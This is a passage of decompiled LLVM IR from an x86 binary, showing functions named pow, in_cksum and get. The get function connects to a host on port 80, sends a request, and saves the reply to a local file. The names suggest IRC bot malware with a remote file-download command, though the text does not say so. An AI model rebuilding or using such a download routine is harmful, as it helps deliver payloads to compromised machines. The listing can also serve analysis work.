dec_label_pc_8048873:                             ; preds = %dec_label_pc_80486c5, %dec_label_pc_80486ac, %dec_label_pc_804865e, %entry, %dec_label_pc_8048830
  %v0_8048877 = phi i32 [ 0, %dec_label_pc_80486c5 ], [ %v2_80486b4, %dec_label_pc_80486ac ], [ %v3_804869b, %dec_label_pc_804865e ], [ %v3_8048649, %entry ], [ %v1_804886e, %dec_label_pc_8048830 ]
  ret i32 %v0_8048877

; uselistorder directives
  uselistorder i32 %v4_80487aa, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_8048785, { 1, 0 }
  uselistorder i32 %v3_80486e7, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_80486b4, { 1, 0 }
  uselistorder i32 %v3_804869b, { 1, 0 }
  uselistorder i32 %v3_8048649, { 1, 8, 6, 7, 4, 5, 2, 3, 0 }
  uselistorder i32* %stack_var_-1260, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_8048873, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048830, { 1, 0 }
  uselistorder label %dec_label_pc_8048800, { 1, 0 }
  uselistorder label %dec_label_pc_80487cb, { 1, 0 }
  uselistorder label %dec_label_pc_8048777, { 1, 0 }
  uselistorder label %dec_label_pc_8048702, { 1, 0 }
}

define i32 @pow(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048878 = load i32, i32* @ebp, align 4
  store i32 %v0_8048878, i32* %stack_var_-4, align 4
  %v4_8048878 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048878, i32* @ebp, align 4
  %v4_804887e = icmp eq i32 %arg2, 0
  %v1_8048882 = icmp eq i1 %v4_804887e, false
  br i1 %v1_8048882, label %dec_label_pc_804888d, label %dec_label_pc_8048884

dec_label_pc_8048884:                             ; preds = %entry
  br label %dec_label_pc_80488b7

dec_label_pc_804888d:                             ; preds = %entry
  %v4_804888d = add i32 %arg2, -1
  %v12_804888d = icmp eq i32 %v4_804888d, 0
  %v1_8048891 = icmp eq i1 %v12_804888d, false
  br i1 %v1_8048891, label %dec_label_pc_804889b, label %dec_label_pc_8048893

dec_label_pc_8048893:                             ; preds = %dec_label_pc_804888d
  %v4_8048893 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_804889b:                             ; preds = %dec_label_pc_804888d
  %v4_80488a6 = call i32 @pow(i64 %arg1, i32 %v4_804888d)
  %v6_80488b0 = sext i32 %v4_80488a6 to i64
  %v8_80488b0 = mul nsw i64 %v6_80488b0, %arg1
  %v9_80488b0 = trunc i64 %v8_80488b0 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_80488b7:                             ; preds = %dec_label_pc_8048893, %dec_label_pc_8048884, %dec_label_pc_804889b
  %v3_80488b7.off0 = phi i32 [ %v4_8048893, %dec_label_pc_8048893 ], [ 1, %dec_label_pc_8048884 ], [ %v9_80488b0, %dec_label_pc_804889b ]
  ret i32 %v3_80488b7.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80488b7, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80488bc = load i32, i32* @ebp, align 4
  %v4_80488f323 = add i32 %arg2, -1
  %v9_80488f324 = sub i32 0, %arg2
  %v10_80488f325 = and i32 %arg2, %v9_80488f324
  %v11_80488f326 = icmp slt i32 %v10_80488f325, 0
  %v12_80488f327 = icmp eq i32 %v4_80488f323, 0
  %v13_80488f328 = icmp slt i32 %v4_80488f323, 0
  %v3_80488f729 = icmp eq i1 %v13_80488f328, %v11_80488f326
  %v4_80488f730 = icmp eq i1 %v12_80488f327, false
  %v5_80488f731 = and i1 %v4_80488f730, %v3_80488f729
  br i1 %v5_80488f731, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488dd:                             ; preds = %entry, %dec_label_pc_80488dd
  %stack_var_-24.034 = phi i16 [ %v6_80488e8, %dec_label_pc_80488dd ], [ 0, %entry ]
  %stack_var_-28.033 = phi i16* [ %v23_80488eb, %dec_label_pc_80488dd ], [ %arg1, %entry ]
  %v3_80488ef32 = phi i32 [ %v4_80488ef, %dec_label_pc_80488dd ], [ %arg2, %entry ]
  %v4_80488dd = ptrtoint i16* %stack_var_-28.033 to i32
  %v2_80488e0 = load i16, i16* %stack_var_-28.033, align 2
  %v6_80488e8 = add i16 %v2_80488e0, %stack_var_-24.034
  %v5_80488eb = add i32 %v4_80488dd, 2
  %v23_80488eb = inttoptr i32 %v5_80488eb to i16*
  %v4_80488ef = add i32 %v3_80488ef32, -2
  %v4_80488f3 = add i32 %v3_80488ef32, -3
  %v9_80488f3 = sub i32 2, %v3_80488ef32
  %v10_80488f3 = and i32 %v4_80488ef, %v9_80488f3
  %v11_80488f3 = icmp slt i32 %v10_80488f3, 0
  %v12_80488f3 = icmp eq i32 %v4_80488f3, 0
  %v13_80488f3 = icmp slt i32 %v4_80488f3, 0
  %v3_80488f7 = icmp eq i1 %v13_80488f3, %v11_80488f3
  %v4_80488f7 = icmp eq i1 %v12_80488f3, false
  %v5_80488f7 = and i1 %v4_80488f7, %v3_80488f7
  br i1 %v5_80488f7, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488f9:                             ; preds = %dec_label_pc_80488dd, %entry
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80488eb, %dec_label_pc_80488dd ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v6_80488e8, %dec_label_pc_80488dd ]
  %v4_80488f7.lcssa = phi i1 [ %v4_80488f730, %entry ], [ %v4_80488f7, %dec_label_pc_80488dd ]
  br i1 %v4_80488f7.lcssa, label %dec_label_pc_8048915, label %dec_label_pc_80488ff

dec_label_pc_80488ff:                             ; preds = %dec_label_pc_80488f9
  %v4_8048902 = ptrtoint i16* %stack_var_-28.0.lcssa to i32
  %v1_8048905 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_8048905 = load i8, i8* %v1_8048905, align 1
  %v3_8048905 = zext i8 %v2_8048905 to i32
  %v5_8048905 = and i32 %v4_8048902, -256
  %v6_8048905 = or i32 %v3_8048905, %v5_8048905
  %v4_804890910 = urem i32 %v6_8048905, 65536
  %v4_804891243 = zext i16 %stack_var_-24.0.lcssa to i32
  %v6_8048912 = add nuw nsw i32 %v4_804890910, %v4_804891243
  %v26_8048912 = trunc i32 %v6_8048912 to i16
  br label %dec_label_pc_8048915

dec_label_pc_8048915:                             ; preds = %dec_label_pc_80488f9, %dec_label_pc_80488ff
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488f9 ], [ %v26_8048912, %dec_label_pc_80488ff ]
  %v4_8048915 = sext i16 %stack_var_-24.1 to i32
  %v2_8048918 = sdiv i32 %v4_8048915, 65536
  %v2_804891f = add nsw i32 %v2_8048918, %v4_8048915
  %sext4 = mul i32 %v2_804891f, 65536
  %v2_8048927 = ashr i32 %sext4, 31
  %v6_804892a12 = mul nsw i32 %v2_8048927, 65536
  %v4_80489241113 = add i32 %v6_804892a12, %sext4
  %v4_804892d22 = udiv i32 %v4_80489241113, 65536
  %v1_804893a = xor i32 %v4_804892d22, 65535
  store i32 %v0_80488bc, i32* @ebp, align 4
  ret i32 %v1_804893a

; uselistorder directives
  uselistorder i32 %sext4, { 1, 0 }
  uselistorder i32 %v4_8048915, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488f3, { 1, 0 }
  uselistorder i32 %v4_80488ef, { 1, 0 }
  uselistorder label %dec_label_pc_8048915, { 1, 0 }
  uselistorder label %dec_label_pc_80488dd, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %v12_8048946 = ptrtoint i32* %stack_var_-5228 to i32
  %v5_804894c = icmp ult i32* %stack_var_-5228, inttoptr (i32 12 to i32*)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048952 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804895a = icmp eq i32 %v1_8048952, 0
  %v1_804895c = icmp eq i1 %v1_804895a, false
  br i1 %v1_804895c, label %dec_label_pc_8048e1a, label %dec_label_pc_8048962

dec_label_pc_8048962:                             ; preds = %entry
  %v4_8048962 = add i32 %arg3, -1
  %v8_8048962 = icmp eq i32 %arg3, 0
  %v9_8048962 = sub i32 0, %arg3
  %v10_8048962 = and i32 %arg3, %v9_8048962
  %v11_8048962 = icmp slt i32 %v10_8048962, 0
  store i1 %v8_8048962, i1* %cf.global-to-local, align 1
  %v12_8048962 = icmp eq i32 %v4_8048962, 0
  %v13_8048962 = icmp slt i32 %v4_8048962, 0
  %v3_8048966 = icmp eq i1 %v13_8048962, %v11_8048962
  %v4_8048966 = icmp eq i1 %v12_8048962, false
  %v5_8048966 = and i1 %v4_8048966, %v3_8048966
  br i1 %v5_8048966, label %dec_label_pc_8048988, label %dec_label_pc_8048968

dec_label_pc_8048968:                             ; preds = %dec_label_pc_8048962
  %v5_8048968 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048968, i1* %cf.global-to-local, align 1
  %v3_8048976 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_805a36c.38 to i32))
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048983 = call i32 @__GI_exit(i32 0)
  %v0_8048988.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048988

dec_label_pc_8048988:                             ; preds = %dec_label_pc_8048962, %dec_label_pc_8048968
  %v0_8048988 = phi i32 [ %v0_8048988.pre, %dec_label_pc_8048968 ], [ %v12_8048946, %dec_label_pc_8048962 ]
  %v5_8048988 = icmp ult i32 %v0_8048988, 4
  store i1 %v5_8048988, i1* %cf.global-to-local, align 1
  %v4_8048991 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_804899c = icmp ne i32 %v4_8048991, -1
  store i1 %v8_804899c, i1* %cf.global-to-local, align 1
  %v13_804899c = icmp eq i32 %v4_8048991, -1
  %v1_80489a0 = icmp eq i1 %v13_804899c, false
  br i1 %v1_80489a0, label %dec_label_pc_80489c2, label %dec_label_pc_80489a2

dec_label_pc_80489a2:                             ; preds = %dec_label_pc_8048988
  %v5_80489a2 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_80489a2, i1* %cf.global-to-local, align 1
  %v3_80489b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_805a390.39 to i32))
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_80489bd = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80489c2

dec_label_pc_80489c2:                             ; preds = %dec_label_pc_8048988, %dec_label_pc_80489a2
  %v1_80489c5 = add i32 %arg4, 4
  %v5_80489c5 = icmp ugt i32 %arg4, -5
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v1_80489c8 = inttoptr i32 %v1_80489c5 to i32*
  %v2_80489c8 = load i32, i32* %v1_80489c8, align 4
  store i1 false, i1* @df, align 1
  %v4_80489e5 = inttoptr i32 %v2_80489c8 to i8*
  store i32 %v2_80489c8, i32* @esi, align 4
  %v7_80489f7 = call i32 @_strncmp(i8* %v4_80489e5, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a3b5.40, i32 0, i32 0), i32 7)
  %v8_80489f7 = urem i32 %v7_80489f7, 2
  %v9_80489f7 = icmp eq i32 %v8_80489f7, 0
  %v0_80489f9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489f9 = or i1 %v0_80489f9, %v9_80489f7
  %v3_80489f9 = zext i1 %v2_80489f9 to i32
  %v4_80489f9 = load i32, i32* @edx, align 4
  %v5_80489f9 = and i32 %v4_80489f9, -256
  %v6_80489f9 = or i32 %v3_80489f9, %v5_80489f9
  %v7_80489f9 = xor i32 %v6_80489f9, 1
  store i32 %v7_80489f9, i32* %edx.global-to-local, align 4
  %v1_8048a01 = trunc i32 %v7_80489f9 to i8
  %v3_8048a01 = zext i1 %v0_80489f9 to i8
  %v15_8048a01 = icmp eq i8 %v1_8048a01, %v3_8048a01
  %v1_8048a0a = icmp eq i1 %v15_8048a01, false
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v2_8048a32 = load i32, i32* %v1_80489c8, align 4
  br i1 %v1_8048a0a, label %dec_label_pc_8048a2c, label %dec_label_pc_8048a0c

dec_label_pc_8048a0c:                             ; preds = %dec_label_pc_80489c2
  %v1_8048a14 = add i32 %v2_8048a32, 7
  %v0_8048a17 = load i32, i32* @esp, align 4
  %v5_8048a17 = icmp ult i32 %v0_8048a17, 8
  store i1 %v5_8048a17, i1* %cf.global-to-local, align 1
  %v2_8048a1b = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a1b, i32* @eax, align 4
  %v3_8048a22 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a22 = call i32 @strcpy(i8* %v3_8048a22, i32 %v1_8048a14)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a2c:                             ; preds = %dec_label_pc_80489c2
  %v0_8048a34 = load i32, i32* @esp, align 4
  %v5_8048a34 = icmp ult i32 %v0_8048a34, 8
  store i1 %v5_8048a34, i1* %cf.global-to-local, align 1
  %v2_8048a38 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a38, i32* @eax, align 4
  %v3_8048a3f = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a3f = call i32 @strcpy(i8* %v3_8048a3f, i32 %v2_8048a32)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a47:                             ; preds = %dec_label_pc_8048a0c, %dec_label_pc_8048a2c
  %v4_8048a6a.pre-phi = phi i8* [ %v3_8048a22, %dec_label_pc_8048a0c ], [ %v3_8048a3f, %dec_label_pc_8048a2c ]
  %v2_8048a56.pre-phi = phi i32 [ %v2_8048a1b, %dec_label_pc_8048a0c ], [ %v2_8048a38, %dec_label_pc_8048a2c ]
  %storemerge15.in = load i32, i32* @esp, align 4
  %storemerge15 = icmp ugt i32 %storemerge15.in, -17
  store i1 %storemerge15, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a50:                             ; preds = %dec_label_pc_8048a7b
  %v4_8048a50 = add i32 %storemerge7, 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a53:                             ; preds = %dec_label_pc_8048a47, %dec_label_pc_8048a50
  %storemerge7 = phi i32 [ %v4_8048a50, %dec_label_pc_8048a50 ], [ 0, %dec_label_pc_8048a47 ]
  store i32 %storemerge7, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a56.pre-phi, i32* @edi, align 4
  %v3_8048a70 = call i32 @_strlen(i8* %v4_8048a6a.pre-phi)
  %v0_8048a77 = load i32, i32* @edx, align 4
  %v7_8048a77 = icmp ult i32 %v0_8048a77, %v3_8048a70
  store i1 %v7_8048a77, i1* %cf.global-to-local, align 1
  %v1_8048a79 = icmp eq i1 %v7_8048a77, false
  br i1 %v1_8048a79, label %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge, label %dec_label_pc_8048a7b

dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge: ; preds = %dec_label_pc_8048a53
  %v0_8048a8c.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge7, -1092
  br label %dec_label_pc_8048a89

dec_label_pc_8048a7b:                             ; preds = %dec_label_pc_8048a53
  %v0_8048a7e = load i32, i32* @ebp, align 4
  %v2_8048a7e = add i32 %storemerge7, -1092
  %v3_8048a7e = add i32 %v0_8048a7e, %v2_8048a7e
  %v4_8048a7e = inttoptr i32 %v3_8048a7e to i8*
  %v5_8048a7e = load i8, i8* %v4_8048a7e, align 1
  %v6_8048a85 = icmp ult i8 %v5_8048a7e, 47
  store i1 %v6_8048a85, i1* %cf.global-to-local, align 1
  %v10_8048a85 = icmp eq i8 %v5_8048a7e, 47
  %v1_8048a87 = icmp eq i1 %v10_8048a85, false
  br i1 %v1_8048a87, label %dec_label_pc_8048a50, label %dec_label_pc_8048a89

dec_label_pc_8048a89:                             ; preds = %dec_label_pc_8048a7b, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge
  %v2_8048a8c.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v2_8048a7e, %dec_label_pc_8048a7b ]
  %v0_8048a8c = phi i32 [ %v0_8048a8c.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v0_8048a7e, %dec_label_pc_8048a7b ]
  %v3_8048a8c = add i32 %v0_8048a8c, %v2_8048a8c.pre-phi
  %v4_8048a8c = inttoptr i32 %v3_8048a8c to i8*
  store i8 0, i8* %v4_8048a8c, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8048a9a = load i32, i32* @esp, align 4
  %v5_8048a9a = icmp ult i32 %v0_8048a9a, 12
  store i1 %v5_8048a9a, i1* %cf.global-to-local, align 1
  %v1_8048a9f = call i32 @htons(i32 80)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048ab5 = call i32 @inet_addr(i32 %v2_8048a56.pre-phi)
  %v8_8048ac0 = icmp ne i32 %v1_8048ab5, -1
  store i1 %v8_8048ac0, i1* %cf.global-to-local, align 1
  %v13_8048ac0 = icmp eq i32 %v1_8048ab5, -1
  %v1_8048ac4 = icmp eq i1 %v13_8048ac0, false
  br i1 %v1_8048ac4, label %dec_label_pc_8048b20, label %dec_label_pc_8048ac6

dec_label_pc_8048ac6:                             ; preds = %dec_label_pc_8048a89
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048ad0 = call i32 @__GI_gethostbyname(i32 %v2_8048a56.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048adb = icmp eq i32 %v1_8048ad0, 0
  %v1_8048adf = icmp eq i1 %v4_8048adb, false
  br i1 %v1_8048adf, label %dec_label_pc_8048b01, label %dec_label_pc_8048ae1

dec_label_pc_8048ae1:                             ; preds = %dec_label_pc_8048ac6
  %v5_8048ae1 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048ae1, i1* %cf.global-to-local, align 1
  %v3_8048aef = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a3c0.41 to i32))
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048afc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b01

dec_label_pc_8048b01:                             ; preds = %dec_label_pc_8048ac6, %dec_label_pc_8048ae1
  %v1_8048b04 = add i32 %v1_8048ad0, 12
  %v2_8048b04 = inttoptr i32 %v1_8048b04 to i32*
  %v3_8048b04 = load i32, i32* %v2_8048b04, align 4
  %v1_8048b0c = add i32 %v1_8048ad0, 16
  %v2_8048b0c = inttoptr i32 %v1_8048b0c to i32*
  %v3_8048b0c = load i32, i32* %v2_8048b0c, align 4
  %v1_8048b0f = inttoptr i32 %v3_8048b0c to i32*
  %v2_8048b0f = load i32, i32* %v1_8048b0f, align 4
  store i32 %v2_8048b0f, i32* %edx.global-to-local, align 4
  %v5_8048b14 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048b14, i1* %cf.global-to-local, align 1
  %v15_8048b14 = ptrtoint i32* %stack_var_-68 to i32
  %tmp83 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048b14, i32* @edi, align 4
  %v1_8048b19 = inttoptr i32 %v2_8048b0f to i8*
  store i32 %v2_8048b0f, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048b1c = call i8* @_memcpy(i8* %tmp83, i8* %v1_8048b19, i32 %v3_8048b04)
  %v8_8048b1c = ptrtoint i8* %v7_8048b1c to i32
  store i32 %v8_8048b1c, i32* @ecx, align 4
  %v0_8048b3c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b20:                             ; preds = %dec_label_pc_8048a89
  store i32 %v1_8048ab5, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b26:                             ; preds = %dec_label_pc_8048b01, %dec_label_pc_8048b20
  %v0_8048b3c = phi i32 [ %v0_8048b3c.pre, %dec_label_pc_8048b01 ], [ %v12_8048946, %dec_label_pc_8048b20 ]
  %v2_8048b26.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048b3c = icmp ult i32 %v0_8048b3c, 4
  store i1 %v5_8048b3c, i1* %cf.global-to-local, align 1
  %v4_8048b45 = call i32 @connect(i32 %v4_8048991, i32 %v2_8048b26.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048b4d = icmp eq i32 %v4_8048b45, 0
  br i1 %v1_8048b4d, label %dec_label_pc_8048b26.dec_label_pc_8048b71_crit_edge, label %dec_label_pc_8048b51

dec_label_pc_8048b26.dec_label_pc_8048b71_crit_edge: ; preds = %dec_label_pc_8048b26
  br label %dec_label_pc_8048b71

dec_label_pc_8048b51:                             ; preds = %dec_label_pc_8048b26
  %v5_8048b51 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b51, i1* %cf.global-to-local, align 1
  %v3_8048b5f = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a3e8.42 to i32))
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  %v1_8048b6c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b71

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b26.dec_label_pc_8048b71_crit_edge, %dec_label_pc_8048b51
  %v2_8048b7c = add i32 %storemerge7, %v2_8048a56.pre-phi
  %v7_8048b7c = icmp ult i32 %v2_8048b7c, %v2_8048a56.pre-phi
  store i1 %v7_8048b7c, i1* %cf.global-to-local, align 1
  %v1_8048b7e = add i32 %v2_8048b7c, 1
  store i32 %v1_8048b7e, i32* %edx.global-to-local, align 4
  %v3_8048b91 = call i32 @Send(i32 %v4_8048991, i32 ptrtoint ([276 x i8]* @global_var_805a410.43 to i32))
  %v5_8048b99 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b99, i1* %cf.global-to-local, align 1
  %v3_8048ba7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_805a524.44 to i32))
  %v1_8048bb2 = add i32 %arg4, 8
  %v5_8048bb2 = icmp ugt i32 %arg4, -9
  %v1_8048bb5 = inttoptr i32 %v1_8048bb2 to i32*
  %v2_8048bb5 = load i32, i32* %v1_8048bb5, align 4
  store i32 %v2_8048bb5, i32* @eax, align 4
  %v5_8048bb7 = icmp ult i32* %stack_var_-5228, inttoptr (i32 8 to i32*)
  store i1 %v5_8048bb7, i1* %cf.global-to-local, align 1
  %v3_8048bc0 = call i32 @__GI_fopen(i32 %v2_8048bb5, i32 ptrtoint ([3 x i8]* @global_var_805a540.45 to i32))
  %v0_8048bc5 = load i32, i32* @esp, align 4
  %v2_8048bc5 = icmp ugt i32 %v0_8048bc5, -17
  store i1 %v2_8048bc5, i1* %cf.global-to-local, align 1
  %v2_8048bd2 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048bdc121 = call i32 @recv(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp84123 = icmp slt i32 %v5_8048bdc121, 1
  br i1 %tmp84123, label %dec_label_pc_8048d08.loopexit16, label %dec_label_pc_8048bf1

dec_label_pc_8048bcb.loopexit:                    ; preds = %dec_label_pc_8048cf4
  %v5_8048bdc = call i32 @recv(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp84 = icmp slt i32 %v5_8048bdc, 1
  br i1 %tmp84, label %dec_label_pc_8048d08.loopexit16, label %dec_label_pc_8048bf1

dec_label_pc_8048bf1:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048bcb.loopexit
  %v5_8048bdc124 = phi i32 [ %v5_8048bdc, %dec_label_pc_8048bcb.loopexit ], [ %v5_8048bdc121, %dec_label_pc_8048b71 ]
  %v4_8048bf1 = add i32 %v5_8048bdc124, -4095
  %v8_8048bf1 = icmp ult i32 %v5_8048bdc124, 4095
  %v9_8048bf1 = sub i32 4094, %v5_8048bdc124
  %v10_8048bf1 = and i32 %v9_8048bf1, %v5_8048bdc124
  %v11_8048bf1 = icmp slt i32 %v10_8048bf1, 0
  store i1 %v8_8048bf1, i1* %cf.global-to-local, align 1
  %v12_8048bf1 = icmp eq i32 %v4_8048bf1, 0
  %v13_8048bf1 = icmp slt i32 %v4_8048bf1, 0
  %v3_8048bf8 = icmp eq i1 %v13_8048bf1, %v11_8048bf1
  %v4_8048bf8 = icmp eq i1 %v12_8048bf1, false
  %v5_8048bf8 = and i1 %v4_8048bf8, %v3_8048bf8
  br i1 %v5_8048bf8, label %dec_label_pc_8048c11.lr.ph, label %dec_label_pc_8048bfa

dec_label_pc_8048bfa:                             ; preds = %dec_label_pc_8048bf1
  %v0_8048bfd = load i32, i32* @ebp, align 4
  %v2_8048bfd = add i32 %v5_8048bdc124, -5188
  %v3_8048bfd = add i32 %v2_8048bfd, %v0_8048bfd
  %v4_8048bfd = inttoptr i32 %v3_8048bfd to i8*
  store i8 0, i8* %v4_8048bfd, align 1
  br label %dec_label_pc_8048c11.lr.ph

dec_label_pc_8048c11.lr.ph:                       ; preds = %dec_label_pc_8048bfa, %dec_label_pc_8048bf1
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c11

dec_label_pc_8048c11:                             ; preds = %dec_label_pc_8048c11.lr.ph, %dec_label_pc_8048cf4
  %storemerge6120 = phi i32 [ 0, %dec_label_pc_8048c11.lr.ph ], [ %v4_8048cf4, %dec_label_pc_8048cf4 ]
  store i32 %storemerge6120, i32* %edx.global-to-local, align 4
  %v2_8048c1c = add i32 %storemerge6120, %v2_8048bd2
  %v7_8048c1c = icmp ult i32 %v2_8048c1c, %v2_8048bd2
  store i1 %v7_8048c1c, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048c39 = inttoptr i32 %v2_8048c1c to i8*
  store i32 %v2_8048c1c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805a543.46 to i32), i32* @edi, align 4
  %v7_8048c4b = call i32 @_strncmp(i8* %v4_8048c39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a543.46, i32 0, i32 0), i32 4)
  %v8_8048c4b = urem i32 %v7_8048c4b, 2
  %v9_8048c4b = icmp eq i32 %v8_8048c4b, 0
  %v0_8048c4d = load i1, i1* %cf.global-to-local, align 1
  %v2_8048c4d = or i1 %v0_8048c4d, %v9_8048c4b
  %v3_8048c4d = zext i1 %v2_8048c4d to i32
  %v4_8048c4d = load i32, i32* %edx.global-to-local, align 4
  %v5_8048c4d = and i32 %v4_8048c4d, -256
  %v6_8048c4d = or i32 %v3_8048c4d, %v5_8048c4d
  %v7_8048c4d = xor i32 %v6_8048c4d, 1
  store i32 %v7_8048c4d, i32* @edx, align 4
  %v3_8048c53 = and i32 %v7_8048c4b, -256
  %v1_8048c55 = trunc i32 %v7_8048c4d to i8
  %v3_8048c55 = zext i1 %v0_8048c4d to i8
  %v4_8048c55 = sub nsw i8 %v1_8048c55, %v3_8048c55
  %v15_8048c55 = icmp eq i8 %v4_8048c55, 0
  %v20_8048c55 = zext i8 %v4_8048c55 to i32
  %v23_8048c55 = or i32 %v20_8048c55, %v3_8048c53
  store i32 %v23_8048c55, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c5e = icmp eq i1 %v15_8048c55, false
  br i1 %v1_8048c5e, label %dec_label_pc_8048cf4, label %dec_label_pc_8048c64

dec_label_pc_8048c64:                             ; preds = %dec_label_pc_8048c11
  %v4_8048c64 = add i32 %storemerge6120, 4
  %v1_8048c73 = add i32 %v3_8048bc0, 52
  %v2_8048c73 = inttoptr i32 %v1_8048c73 to i32*
  %v1_8048c7d = add i32 %v3_8048bc0, 16
  %v2_8048c7d = inttoptr i32 %v1_8048c7d to i32*
  %v1_8048c83 = add i32 %v3_8048bc0, 28
  %v2_8048c83 = inttoptr i32 %v1_8048c83 to i32*
  %v10_8048ce9104 = icmp ult i32 %v4_8048c64, %v5_8048bdc124
  store i1 %v10_8048ce9104, i1* %cf.global-to-local, align 1
  %v5_8048cec110 = icmp slt i32 %v4_8048c64, %v5_8048bdc124
  br i1 %v5_8048cec110, label %dec_label_pc_8048c6a, label %dec_label_pc_8048d08

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3
  %storemerge12.in111 = phi i32 [ %v4_8048ce3, %dec_label_pc_8048ce3 ], [ %v4_8048c64, %dec_label_pc_8048c64 ]
